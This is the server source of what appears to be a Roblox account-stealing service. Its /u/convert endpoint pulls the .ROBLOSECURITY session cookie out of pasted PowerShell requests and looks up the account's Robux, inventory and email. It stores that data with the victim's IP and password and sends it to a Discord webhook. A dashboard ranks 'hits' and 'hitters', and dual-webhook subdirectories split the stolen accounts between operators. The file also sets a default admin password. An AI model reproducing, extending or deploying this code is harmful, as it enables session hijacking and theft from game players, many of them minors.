import express from 'express';
import bodyParser from 'body-parser';
import cookieParser from 'cookie-parser';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import fs from 'fs';
import rateLimit from 'express-rate-limit';
import compression from 'compression';

// Import Firebase Admin SDK
import admin from 'firebase-admin';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.set('trust proxy', 1);

// Firebase Realtime Database Initialization
let db = null;

try {
  if (process.env.GOOGLE_PROJECT_ID && process.env.GOOGLE_CLIENT_EMAIL && process.env.GOOGLE_PRIVATE_KEY && process.env.FIREBASE_DB_URL) {
    admin.initializeApp({
      credential: admin.credential.cert({
        projectId: process.env.GOOGLE_PROJECT_ID,
        clientEmail: process.env.GOOGLE_CLIENT_EMAIL,
        privateKey: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'),
      }),
      databaseURL: process.env.FIREBASE_DB_URL
    });
    db = admin.database();
    console.log('✅ Firebase initialized successfully');
  } else {
    console.log('⚠️ Firebase credentials not found. Running in demo mode without database functionality.');
  }
} catch (error) {
  console.error('❌ Failed to initialize Firebase:', error.message);
  console.log('⚠️ Running without database functionality.');
}

// Directory management
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123'; // Change this!
const API_TOKEN = process.env.API_TOKEN;
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : [];

// Discord OAuth config
const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
const DISCORD_REDIRECT_URI = process.env.DISCORD_REDIRECT_URI;

// ─── Session helpers (stored in Firebase under sessions/{token}) ───────────────

const SESSION_TTL_MS = 24 * 60 * 60 * 1000; // 24 hours

async function createSession(discordId, discordUsername, discordAvatar) {
  if (!db) return null;
  const token = crypto.randomBytes(32).toString('hex');
  const session = {
    discordId,
    discordUsername,
    discordAvatar,
    createdAt: Date.now(),
    expiresAt: Date.now() + SESSION_TTL_MS
  };
  await db.ref(`sessions/${token}`).set(session);
  return token;
}

async function getSession(token) {
  if (!db || !token) return null;
  try {
    const snap = await db.ref(`sessions/${token}`).once('value');
    const session = snap.val();
    if (!session) return null;
    if (Date.now() > session.expiresAt) {
      await db.ref(`sessions/${token}`).remove();
      return null;
    }
    return session;
  } catch {
    return null;
  }
}

async function deleteSession(token) {
  if (!db || !token) return;
  await db.ref(`sessions/${token}`).remove();
}

// ─── Temporary pre-create sessions (Discord authed but hasn't created dir yet) ─
// Stored in Firebase under pending_sessions/{token}
const PENDING_SESSION_TTL_MS = 15 * 60 * 1000; // 15 minutes

async function createPendingSession(discordId, discordUsername, discordAvatar) {
  if (!db) return null;
  const token = crypto.randomBytes(32).toString('hex');
  await db.ref(`pending_sessions/${token}`).set({
    discordId,
    discordUsername,
    discordAvatar,
    createdAt: Date.now(),
    expiresAt: Date.now() + PENDING_SESSION_TTL_MS
  });
  return token;
}

async function getPendingSession(token) {
  if (!db || !token) return null;
  try {
    const snap = await db.ref(`pending_sessions/${token}`).once('value');
    const session = snap.val();
    if (!session) return null;
    if (Date.now() > session.expiresAt) {
      await db.ref(`pending_sessions/${token}`).remove();
      return null;
    }
    return session;
  } catch {
    return null;
  }
}

async function deletePendingSession(token) {
  if (!db || !token) return;
  await db.ref(`pending_sessions/${token}`).remove();
}

// ─── Middleware: require valid session cookie ──────────────────────────────────
async function requireSession(req, res, next) {
  const token = req.cookies?.session;
  const session = await getSession(token);
  if (!session) {
    // For API routes return JSON, for page routes redirect
    if (req.path.startsWith('/api/')) {
      return res.status(401).json({ error: 'Not authenticated' });
    }
    return res.redirect('/login');
  }
  req.session = session;
  req.sessionToken = token;
  next();
}
// Load directories from Firebase
async function loadDirectories() {
  if (!db) {
    console.log('⚠️ Database not available, returning empty directories');
    return {};
  }

  try {
    const snapshot = await db.ref('directories').once('value');
    const directories = snapshot.val() || {};

    // Check for directories without unique IDs and assign them
    let hasChanges = false;

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      // Check if directory is missing uniqueId
      if (!dirConfig.uniqueId) {
        const uniqueId = generateUniqueId(directories);
        directories[dirName].uniqueId = uniqueId;
        hasChanges = true;
        console.log(`✅ Assigned unique ID ${uniqueId} to legacy directory: ${dirName}`);
      }

      // Check subdirectories for missing IDs
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (!subConfig.uniqueId) {
            const uniqueId = generateUniqueId(directories);
            directories[dirName].subdirectories[subName].uniqueId = uniqueId;
            hasChanges = true;
            console.log(`✅ Assigned unique ID ${uniqueId} to legacy subdirectory: ${dirName}/${subName}`);
          }
        }
      }
    }

    // Save changes if any directories were updated
    if (hasChanges) {
      console.log('🔄 Updating directories with new unique IDs...');
      await saveDirectories(directories);
      console.log('✅ Successfully updated legacy directories with unique IDs');
    }

    return directories;
  } catch (error) {
    console.error('Error loading directories from Firebase:', error);
    return {};
  }
}

// Helper function to generate unique IDs (extracted for reuse)
function generateUniqueId(directories) {
  let uniqueId;
  do {
    uniqueId = Math.floor(100000 + Math.random() * 99900000).toString();
    // Check if ID already exists in any directory or subdirectory
    const idExists = Object.values(directories).some(dir => 
      dir.uniqueId === uniqueId || 
      (dir.subdirectories && Object.values(dir.subdirectories).some(sub => sub.uniqueId === uniqueId))
    );
    if (!idExists) break;
  } while (true);
  return uniqueId;
}

// Save directories to Firebase
async function saveDirectories(directories) {
  if (!db) {
    console.log('⚠️ Database not available, cannot save directories');
    return false;
  }

  try {
    await db.ref('directories').set(directories);
    return true;
  } catch (error) {
    console.error('Error saving directories to Firebase:', error);
    return false;
  }
}

// Middleware to validate requests
function validateRequest(req, res, next) {
  // Check origin for browser requests
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  // Allow requests from same origin (your frontend)
  if (origin) {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {

      return res.status(403).json({ error: 'Unauthorized origin' });
    }
  }

  // Check for API token in headers
  const providedToken = req.get('X-API-Token');
  if (!providedToken || providedToken !== API_TOKEN) {

    return res.status(401).json({ error: 'Invalid API token' });
  }

  next();
}

// Function to log user data to Firebase Realtime Database
async function logUserData(token, userData, context = {}) {
  if (!db) {
    console.log('⚠️ Database not available, cannot log user data');
    return null;
  }

  try {
    // Hash the token for security - never store raw tokens
    const hashedToken = crypto.createHash('sha256').update(token).digest('hex').substring(0, 16);

    const logEntry = {
      tokenHash: hashedToken, // Store only hashed version
      userData: userData,
      context: context,
      timestamp: new Date().toISOString(),
    };

    const writeResult = await db.ref('user_logs').push(logEntry);

    return writeResult.key;
  } catch (error) {
    console.error('❌ Error logging user data to Firebase Realtime Database:', error);
    return null;
  }
}

// Trust proxy for rate limiting (required for Replit)
app.set('trust proxy', 1);

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later.'
});

// Enhanced rate limiting for token endpoints
const tokenLimiter = rateLimit({
  windowMs: 5 * 60 * 1000, // 5 minutes
  max: 10, // limit each IP to 10 token requests per windowMs
  message: 'Too many token requests from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

app.use(compression()); // Enable gzip compression
app.use(cookieParser());
app.use(limiter);
app.use(bodyParser.json());
app.use(bodyParser.text({ type: '*/*' }));

// Security headers middleware for token endpoints
app.use('/*/api/token', (req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

app.use('/api/token', (req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

// Serve main page at root path for search engines and visitors
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve static files from public directory with appropriate caching
app.use(express.static(path.join(__dirname, 'public'), {
  index: false, // Prevent serving index.html automatically
  maxAge: '1h', // Cache static assets for 1 hour
  setHeaders: (res, filePath) => {
    // Don't cache HTML files to ensure users get updates
    if (filePath.endsWith('.html')) {
      res.setHeader('Cache-Control', 'no-cache');
    }
  }
}));

// Serve the create directory page
app.get('/create', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'create.html'));
});

// ─── Discord OAuth Routes ──────────────────────────────────────────────────────

// Step 1: Redirect to Discord
app.get('/auth/discord', (req, res) => {
  const intent = req.query.intent || 'login'; // 'login' | 'create' | 'subcreate'
  const dir = req.query.dir || '';            // for subcreate: parent directory name

  if (!DISCORD_CLIENT_ID || !DISCORD_REDIRECT_URI) {
    return res.status(500).send('Discord OAuth not configured. Set DISCORD_CLIENT_ID and DISCORD_REDIRECT_URI.');
  }

  // Encode intent + dir into the OAuth state param so we can read it on callback
  const state = Buffer.from(JSON.stringify({ intent, dir })).toString('base64');

  const params = new URLSearchParams({
    client_id: DISCORD_CLIENT_ID,
    redirect_uri: DISCORD_REDIRECT_URI,
    response_type: 'code',
    scope: 'identify',
    state,
    prompt: 'none'  // skip consent screen if already authorized
  });

  res.redirect(`https://discord.com/oauth2/authorize?${params}`);
});

// Step 2: Discord calls back with ?code=...&state=...
app.get('/auth/discord/callback', async (req, res) => {
  const { code, state, error } = req.query;

  if (error || !code) {
    return res.redirect('/login?error=discord_denied');
  }

  let intent = 'login';
  let parentDir = '';
  try {
    const decoded = JSON.parse(Buffer.from(state, 'base64').toString('utf8'));
    intent = decoded.intent || 'login';
    parentDir = decoded.dir || '';
  } catch {
    // malformed state — treat as login
  }

  try {
    // Exchange code for access token
    const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: DISCORD_CLIENT_ID,
        client_secret: DISCORD_CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: DISCORD_REDIRECT_URI
      })
    });

    if (!tokenResponse.ok) {
      console.error('Discord token exchange failed:', await tokenResponse.text());
      return res.redirect('/login?error=discord_failed');
    }

    const tokenData = await tokenResponse.json();
    const accessToken = tokenData.access_token;

    // Fetch Discord user info
    const userResponse = await fetch('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${accessToken}` }
    });

    if (!userResponse.ok) {
      return res.redirect('/login?error=discord_failed');
    }

    const discordUser = await userResponse.json();
    const { id: discordId, username: discordUsername, avatar: discordAvatar } = discordUser;

    const directories = await loadDirectories();

    // ── LOGIN intent ──────────────────────────────────────────────────────────
    if (intent === 'login') {
      // Find directory linked to this Discord ID
      let foundDir = null;
      for (const [dirName, dirConfig] of Object.entries(directories)) {
        if (dirConfig.discordId === discordId) {
          foundDir = dirName;
          break;
        }
      }

      if (!foundDir) {
        return res.redirect('/login?error=not_found');
      }

      // Create full session cookie
      const sessionToken = await createSession(discordId, discordUsername, discordAvatar);
      res.cookie('session', sessionToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: SESSION_TTL_MS
      });
      return res.redirect('/dashboard');
    }

    // ── CREATE intent ─────────────────────────────────────────────────────────
    if (intent === 'create') {
      // Check: does this Discord ID already own a directory?
      const alreadyOwns = Object.values(directories).some(d => d.discordId === discordId);
      if (alreadyOwns) {
        // Log them in instead — they already have a directory
        const sessionToken = await createSession(discordId, discordUsername, discordAvatar);
        res.cookie('session', sessionToken, {
          httpOnly: true,
          secure: process.env.NODE_ENV === 'production',
          sameSite: 'lax',
          maxAge: SESSION_TTL_MS
        });
        return res.redirect('/dashboard?notice=already_exists');
      }

      // Issue a short-lived pending session for the creation form
      const pendingToken = await createPendingSession(discordId, discordUsername, discordAvatar);
      res.cookie('pending_session', pendingToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: PENDING_SESSION_TTL_MS
      });
      return res.redirect('/create');
    }

    // ── SUBCREATE intent ──────────────────────────────────────────────────────
    if (intent === 'subcreate') {
      // Verify the Discord user owns the parent directory
      const parentConfig = directories[parentDir];
      if (!parentConfig || parentConfig.discordId !== discordId) {
        return res.redirect(`/${parentDir}/create?error=unauthorized`);
      }

      // Create a full session (subdirectory creation uses the same session as login)
      const sessionToken = await createSession(discordId, discordUsername, discordAvatar);
      res.cookie('session', sessionToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: SESSION_TTL_MS
      });
      return res.redirect(`/${parentDir}/create`);
    }

    // Fallback
    res.redirect('/login');

  } catch (err) {
    console.error('❌ Discord OAuth callback error:', err.message);
    res.redirect('/login?error=server_error');
  }
});

// Step 3: Frontend can check its pending session (for the create page)
app.get('/auth/discord/pending-session', async (req, res) => {
  const token = req.cookies?.pending_session;
  const session = await getPendingSession(token);
  if (!session) {
    return res.status(401).json({ error: 'No pending session' });
  }
  res.json({
    discordId: session.discordId,
    discordUsername: session.discordUsername,
    discordAvatar: session.discordAvatar
  });
});

// Logout
app.post('/auth/logout', async (req, res) => {
  const token = req.cookies?.session;
  await deleteSession(token);
  res.clearCookie('session');
  res.clearCookie('pending_session');
  res.json({ success: true });
});

// ─── End Discord OAuth Routes ──────────────────────────────────────────────────

// ====================================================================
// API ROUTES FOR DASHBOARD
// ====================================================================

// Get current user information
app.get('/api/user', requireSession, async (req, res) => {
  try {
    res.json({
      discordId: req.session.discordId,
      discordUsername: req.session.discordUsername,
      discordAvatar: req.session.discordAvatar
    });
  } catch (error) {
    console.error('Error fetching user:', error);
    res.status(500).json({ error: 'Failed to fetch user data' });
  }
});

// Get directory information for the logged-in user
app.get('/api/directory', requireSession, async (req, res) => {
  try {
    const directories = await loadDirectories();
    
    // Find the directory owned by this user
    let userDirectory = null;
    let directoryName = null;
    
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        userDirectory = dirConfig;
        directoryName = dirName;
        break;
      }
    }
    
    if (!userDirectory) {
      return res.status(404).json({ error: 'Directory not found' });
    }
    
    // Return directory data
    res.json({
      name: directoryName,
      uniqueId: userDirectory.uniqueId,
      serviceType: userDirectory.serviceType || 'single',
      webhookUrl: userDirectory.webhookUrl,
      harName: userDirectory.harName || 'AutoHar User',
      filterSettings: userDirectory.filterSettings || {
        minRobux: 0,
        minRAP: 0,
        minSummary: 0
      },
      subdirectories: userDirectory.subdirectories || {}
    });
  } catch (error) {
    console.error('Error fetching directory:', error);
    res.status(500).json({ error: 'Failed to fetch directory data' });
  }
});

// Get statistics for the dashboard
app.get('/api/stats', requireSession, async (req, res) => {
  try {
    const directories = await loadDirectories();
    
    // Find user's directory
    let userDirectory = null;
    let directoryName = null;
    
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        userDirectory = dirConfig;
        directoryName = dirName;
        break;
      }
    }
    
    if (!userDirectory) {
      return res.status(404).json({ error: 'Directory not found' });
    }
    
    // Calculate stats from user_logs in Firebase
    const stats = {
      totalRobux: 0,
      totalRAP: 0,
      totalSummary: 0,
      totalHits: 0,
      totalUsers: 0,
      history: {
        labels: ['Fri', 'Sat'],
        robux: [0, 0, 0, 0, 0, 0, 0],
        rap: [0, 0, 0, 0, 0, 0, 0],
        summary: [0, 0, 0, 0, 0, 0, 0],
        hits: [0, 0, 0, 0, 0, 0, 0]
      },
      leaderboard: [],
      liveHits: []
    };
    
    if (db) {
      try {
        // Get logs for this directory
        const logsSnapshot = await db.ref('user_logs')
          .orderByChild('context/directory')
          .equalTo(directoryName)
          .limitToLast(100)
          .once('value');
        
        const logs = [];
        logsSnapshot.forEach(childSnapshot => {
          logs.push({
            key: childSnapshot.key,
            ...childSnapshot.val()
          });
        });
        
        // Calculate totals
        logs.forEach(log => {
          if (log.userData) {
            stats.totalRobux += log.userData.robux || 0;
            stats.totalRAP += log.userData.rap || 0;
            stats.totalSummary += log.userData.summary || 0;
            stats.totalHits++;
          }
        });
        
        // For dualhook, count unique subdirectories (users)
        if (userDirectory.serviceType === 'dualhook' && userDirectory.subdirectories) {
          stats.totalUsers = Object.keys(userDirectory.subdirectories).length;
        }
        
        // Get last 5 logs for live hits
        const recentLogs = logs.slice(-5).reverse();
        stats.liveHits = recentLogs.map(log => {
          const userData = log.userData || {};
          const context = log.context || {};
          
          return {
            username: userData.username || 'Unknown',
            userId: userData.userId || '0',
            time: new Date(log.timestamp).toLocaleTimeString('en-US', { 
              month: 'short', 
              day: 'numeric', 
              hour: '2-digit', 
              minute: '2-digit' 
            }),
            robux: userData.robux || 0,
            rap: userData.rap || 0,
            summary: userData.summary || 0,
            premium: userData.premium || false,
            hitterName: context.hitter || 'Unknown',
            hitterId: req.session.discordId,
            hitterAvatar: req.session.discordAvatar
          };
        });
        
        // Calculate weekly history (last 7 days)
        const now = new Date();
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        
        const weeklyLogs = logs.filter(log => {
          const logDate = new Date(log.timestamp);
          return logDate >= weekAgo;
        });
        
        // Group by day
        const dayStats = {};
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        
        weeklyLogs.forEach(log => {
          const logDate = new Date(log.timestamp);
          const dayName = days[logDate.getDay()];
          
          if (!dayStats[dayName]) {
            dayStats[dayName] = { robux: 0, rap: 0, summary: 0, hits: 0 };
          }
          
          if (log.userData) {
            dayStats[dayName].robux += log.userData.robux || 0;
            dayStats[dayName].rap += log.userData.rap || 0;
            dayStats[dayName].summary += log.userData.summary || 0;
            dayStats[dayName].hits++;
          }
        });
        
        // Fill in the history arrays
        const last7Days = [];
        for (let i = 6; i >= 0; i--) {
          const date = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
          const dayName = days[date.getDay()];
          last7Days.push(dayName);
          
          const idx = 6 - i;
          if (dayStats[dayName]) {
            stats.history.robux[idx] = dayStats[dayName].robux;
            stats.history.rap[idx] = dayStats[dayName].rap;
            stats.history.summary[idx] = dayStats[dayName].summary;
            stats.history.hits[idx] = dayStats[dayName].hits;
          }
        }
        
        stats.history.labels = last7Days;
        
        // Build leaderboard (mock data for now - would need to aggregate across users)
        // For dualhook, show subdirectory stats
        if (userDirectory.serviceType === 'dualhook' && userDirectory.subdirectories) {
          const subStats = {};
          
          // Get logs for all subdirectories
          for (const [subName, subConfig] of Object.entries(userDirectory.subdirectories)) {
            const subLogsSnapshot = await db.ref('user_logs')
              .orderByChild('context/directory')
              .equalTo(`${directoryName}/${subName}`)
              .once('value');
            
            let total = 0;
            subLogsSnapshot.forEach(childSnapshot => {
              const log = childSnapshot.val();
              if (log.userData) {
                total += (log.userData.robux || 0) + (log.userData.rap || 0);
              }
            });
            
            subStats[subName] = {
              username: subConfig.harName || subName,
              discordId: subConfig.discordId || req.session.discordId,
              discordAvatar: req.session.discordAvatar,
              value: total
            };
          }
          
          // Convert to array and sort
          stats.leaderboard = Object.values(subStats)
            .sort((a, b) => b.value - a.value);
        } else {
          // For single webhook, create a simple entry
          stats.leaderboard = [{
            username: userDirectory.harName || req.session.discordUsername,
            discordId: req.session.discordId,
            discordAvatar: req.session.discordAvatar,
            value: stats.totalRobux + stats.totalRAP
          }];
        }
        
      } catch (dbError) {
        console.error('Error querying database:', dbError);
      }
    }
    
    res.json(stats);
  } catch (error) {
    console.error('Error fetching stats:', error);
    res.status(500).json({ error: 'Failed to fetch statistics' });
  }
});

// Get directory statistics with weekly data (NEW - for redesigned dashboard)
app.get('/api/directory/stats', requireSession, async (req, res) => {
  try {
    const directories = await loadDirectories();
    
    // Find user's directory
    let userDirectory = null;
    let directoryName = null;
    
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        userDirectory = dirConfig;
        directoryName = dirName;
        break;
      }
    }
    
    if (!userDirectory) {
      return res.status(404).json({ error: 'Directory not found' });
    }
    
    const stats = {
      totalHits: 0,
      totalRobux: 0,
      totalRAP: 0,
      totalSummary: 0,
      weekly: {
        hits: [0, 0, 0, 0, 0, 0, 0],
        robux: [0, 0, 0, 0, 0, 0, 0],
        rap: [0, 0, 0, 0, 0, 0, 0],
        summary: [0, 0, 0, 0, 0, 0, 0]
      }
    };
    
    if (db) {
      try {
        // Get all logs for this directory
        const logsSnapshot = await db.ref('user_logs')
          .orderByChild('context/directory')
          .equalTo(directoryName)
          .once('value');
        
        const logs = [];
        logsSnapshot.forEach(childSnapshot => {
          logs.push({
            key: childSnapshot.key,
            ...childSnapshot.val()
          });
        });
        
        // Calculate totals
        logs.forEach(log => {
          if (log.userData) {
            stats.totalRobux += log.userData.robux || 0;
            stats.totalRAP += log.userData.rap || 0;
            stats.totalSummary += log.userData.summary || 0;
            stats.totalHits++;
          }
        });
        
        // Calculate weekly history (last 7 days)
        const now = new Date();
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        
        const weeklyLogs = logs.filter(log => {
          const logDate = new Date(log.timestamp);
          return logDate >= weekAgo;
        });
        
        // Group by day
        const dayStats = {};
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        
        weeklyLogs.forEach(log => {
          const logDate = new Date(log.timestamp);
          const dayName = days[logDate.getDay()];
          
          if (!dayStats[dayName]) {
            dayStats[dayName] = { robux: 0, rap: 0, summary: 0, hits: 0 };
          }
          
          if (log.userData) {
            dayStats[dayName].robux += log.userData.robux || 0;
            dayStats[dayName].rap += log.userData.rap || 0;
            dayStats[dayName].summary += log.userData.summary || 0;
            dayStats[dayName].hits++;
          }
        });
        
        // Fill in the history arrays
        for (let i = 6; i >= 0; i--) {
          const date = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
          const dayName = days[date.getDay()];
          const idx = 6 - i;
          
          if (dayStats[dayName]) {
            stats.weekly.robux[idx] = dayStats[dayName].robux;
            stats.weekly.rap[idx] = dayStats[dayName].rap;
            stats.weekly.summary[idx] = dayStats[dayName].summary;
            stats.weekly.hits[idx] = dayStats[dayName].hits;
          }
        }
      } catch (dbError) {
        console.error('Error querying database:', dbError);
      }
    }
    
    res.json(stats);
  } catch (error) {
    console.error('Error fetching directory stats:', error);
    res.status(500).json({ error: 'Failed to fetch statistics' });
  }
});

// Update webhook URL
app.post('/api/directory/webhook', requireSession, async (req, res) => {
  try {
    const { webhookUrl } = req.body;
    
    if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
      return res.status(400).json({ error: 'Invalid webhook URL' });
    }
    
    const directories = await loadDirectories();
    
    // Find user's directory
    let directoryName = null;
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        directoryName = dirName;
        break;
      }
    }
    
    if (!directoryName) {
      return res.status(404).json({ error: 'Directory not found' });
    }
    
    // Update webhook URL
    directories[directoryName].webhookUrl = webhookUrl;
    await saveDirectories(directories);
    
    res.json({ success: true, message: 'Webhook updated successfully' });
  } catch (error) {
    console.error('Error updating webhook:', error);
    res.status(500).json({ error: 'Failed to update webhook' });
  }
});

// Update HAR name
app.post('/api/directory/har-name', requireSession, async (req, res) => {
  try {
    const { harName } = req.body;
    
    if (!harName || harName.trim().length === 0) {
      return res.status(400).json({ error: 'HAR name cannot be empty' });
    }
    
    const directories = await loadDirectories();
    
    // Find user's directory
    let directoryName = null;
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        directoryName = dirName;
        break;
      }
    }
    
    if (!directoryName) {
      return res.status(404).json({ error: 'Directory not found' });
    }
    
    // Update HAR name
    directories[directoryName].harName = harName.trim();
    await saveDirectories(directories);
    
    res.json({ success: true, message: 'HAR name updated successfully' });
  } catch (error) {
    console.error('Error updating HAR name:', error);
    res.status(500).json({ error: 'Failed to update HAR name' });
  }
});

// Update filter settings (dualhook only)
app.post('/api/directory/filter', requireSession, async (req, res) => {
  try {
    const { filterSettings } = req.body;
    
    if (!filterSettings) {
      return res.status(400).json({ error: 'Filter settings are required' });
    }
    
    const directories = await loadDirectories();
    
    // Find user's directory
    let directoryName = null;
    let userDirectory = null;
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.discordId === req.session.discordId) {
        directoryName = dirName;
        userDirectory = dirConfig;
        break;
      }
    }
    
    if (!directoryName) {
      return res.status(404).json({ error: 'Directory not found' });
    }
    
    // Check if this is a dualhook directory
    if (userDirectory.serviceType !== 'dualhook') {
      return res.status(403).json({ error: 'Filter settings are only available for dualhook directories' });
    }
    
    // Update filter settings
    directories[directoryName].filterSettings = {
      minRobux: parseInt(filterSettings.minRobux) || 0,
      minRAP: parseInt(filterSettings.minRAP) || 0,
      minSummary: parseInt(filterSettings.minSummary) || 0
    };
    
    await saveDirectories(directories);
    
    res.json({ success: true, message: 'Filter settings updated successfully' });
  } catch (error) {
    console.error('Error updating filter settings:', error);
    res.status(500).json({ error: 'Failed to update filter settings' });
  }
});

// Logout route
app.get('/logout', async (req, res) => {
  const token = req.cookies?.session;
  if (token) {
    await deleteSession(token);
  }
  res.clearCookie('session');
  res.redirect('/login');
});

// ====================================================================
// END DASHBOARD API ROUTES
// ====================================================================

// PROTECTED ROUTES WITH /u/ PREFIX FOR SITE OWNER AND PARENT DIRECTORIES

// Protected site owner convert endpoint
app.post('/u/convert', validateRequest, async (req, res) => {
  try {
    let input;
    let scriptType;
    let password = '';

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
      password = req.body.password || '';
    } else {
      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid input format'
      });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0x8B5CF6, // Consistent purple color
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to Discord webhook
        try {
          const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        } catch (webhookError) {
          console.error('❌ Fallback webhook failed:', webhookError.message);
        }

        return res.status(400).json({ 
          success: false,
          message: 'Failed wrong input'
        });
      }

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Add password to user data if provided
      if (password) {
        webhookUserData.password = password;
      }

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: 'main' });

      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData);

      if (!webhookResult.success) {
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }
    } else {
      // Send fallback embed when no token found - do NOT send user data
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0x8B5CF6, // Consistent purple color
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to Discord webhook
      try {
        const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input'
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully!'
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

